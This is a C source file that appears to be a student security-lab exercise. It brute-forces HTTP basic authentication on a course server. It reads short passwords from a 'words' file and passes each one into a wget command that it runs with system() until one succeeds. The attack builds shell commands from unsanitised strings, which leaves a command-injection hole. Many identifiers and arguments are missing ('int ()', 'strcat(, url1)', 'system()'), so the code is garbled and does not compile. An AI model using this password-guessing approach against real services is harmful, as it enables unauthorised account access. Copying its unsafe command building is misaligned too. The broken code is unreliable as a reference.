#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<strings.h>
#include <ctype.h>
#include <math.h>
#include <sys/time.h>

int
()
{

	int        , end;
	FILE           *fp;
	int             i, j;
	char            input;
	char            password[30];
	int             check;

	float           total_time;
	int             number;
	 = time();


	if ((fp = fopen("words", "r")) == NULL) {
		fprintf(stderr, "Error : Failed  open words for .\n");
		return (EXIT_FAILURE);
	}
	while ((input = fgetc(fp)) != EOF) {
		j = 0;
		for (i = 0; i < 30; i++)
			password[i] = '\0';

		while(input != '\n' ) {

			password[j] = input;
			j++;
			input = fgetc(fp);
			
		
		}


		if (strlen(password) <= 3) {
			printf("%s\t",password);
			fflush(stdout);
			check = SysCall(password);
			if (check == 0) {
				getpid();
				end = time();
				total_time = (end - ) / 1e9;
				printf("\ntotal time_var = %f ", total_time);
				printf("\n\nAvg getpid() time_var = %f usec\n", total_time);
				printf("\navg time_var  %f / %d = %f\n", total_time, number, total_time / number);
				exit(0);
			}
		}

	}

	return (EXIT_SUCCESS);
}
int
SysCall(char *password)
{
	char            url1[255], url2[255], [255];
	int             rettype;
	rettype = 0;
	strcpy(url1, "wget --non-verbose --http-user= --http-passwd=");
	strcpy(url2, " http://sec-crack.cs.rmit.edu./SEC/2/index.php");

	strcat(, url1);
	strcat(, password);
	strcat(, url2);

	rettype = system();
	
	if (rettype == 0) {
		printf("Successfully retrieved password: %s\n", password);
		return 0;
	}
	strcpy(, "");
}
